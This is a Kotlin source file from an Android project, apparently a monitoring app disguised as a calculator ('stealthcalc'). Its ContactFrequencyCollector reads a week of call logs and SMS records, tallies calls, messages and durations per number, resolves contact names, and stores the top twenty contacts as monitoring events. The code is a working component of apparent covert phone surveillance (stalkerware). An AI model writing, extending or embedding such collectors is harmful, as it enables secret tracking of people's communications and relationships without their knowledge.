package com.stealthcalc.monitoring.collector

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.net.Uri
import androidx.core.content.ContextCompat
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.ContactFrequencyPayload
import com.stealthcalc.monitoring.model.MonitoringEventKind
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class ContactFrequencyCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
) {
    suspend fun collect() {
        if (!repository.isMetricEnabled("contact_frequency")) return

        val contacts = mutableMapOf<String, ContactStats>()
        val weekAgo = System.currentTimeMillis() - 7 * 24 * 3600 * 1000L

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) ==
            PackageManager.PERMISSION_GRANTED) {
            collectCallStats(contacts, weekAgo)
        }

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) ==
            PackageManager.PERMISSION_GRANTED) {
            collectSmsStats(contacts, weekAgo)
        }

        val topContacts = contacts.entries
            .sortedByDescending { it.value.callCount + it.value.smsCount }
            .take(20)

        for ((identifier, stats) in topContacts) {
            val name = resolveContact(identifier)
            val payload = Json.encodeToString(
                ContactFrequencyPayload(
                    contactName = name,
                    identifier = identifier,
                    callCount = stats.callCount,
                    smsCount = stats.smsCount,
                    totalDurationSecs = stats.totalDuration,
                    lastContact = stats.lastContact,
                )
            )
            repository.recordEvent(MonitoringEventKind.CONTACT_FREQUENCY, payload)
        }
    }

    private fun collectCallStats(contacts: MutableMap<String, ContactStats>, since: Long) {
        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.DURATION, CallLog.Calls.DATE),
            "${CallLog.Calls.DATE} > ?",
            arrayOf(since.toString()),
            null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val number = it.getString(0)?.normalizeNumber() ?: continue
                val duration = it.getInt(1)
                val date = it.getLong(2)
                val stats = contacts.getOrPut(number) { ContactStats() }
                stats.callCount++
                stats.totalDuration += duration
                if (date > stats.lastContact) stats.lastContact = date
            }
        }
    }

    private fun collectSmsStats(contacts: MutableMap<String, ContactStats>, since: Long) {
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.DATE),
            "${Telephony.Sms.DATE} > ?",
            arrayOf(since.toString()),
            null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val address = it.getString(0)?.normalizeNumber() ?: continue
                val date = it.getLong(1)
                val stats = contacts.getOrPut(address) { ContactStats() }
                stats.smsCount++
                if (date > stats.lastContact) stats.lastContact = date
            }
        }
    }

    private fun resolveContact(number: String): String? {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) !=
            PackageManager.PERMISSION_GRANTED) return null
        val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number))
        return runCatching {
            context.contentResolver.query(uri, arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME), null, null, null)
                ?.use { if (it.moveToFirst()) it.getString(0) else null }
        }.getOrNull()
    }

    private fun String.normalizeNumber(): String = filter { it.isDigit() || it == '+' }.takeLast(10)

    private data class ContactStats(
        var callCount: Int = 0,
        var smsCount: Int = 0,
        var totalDuration: Int = 0,
        var lastContact: Long = 0,
    )
}
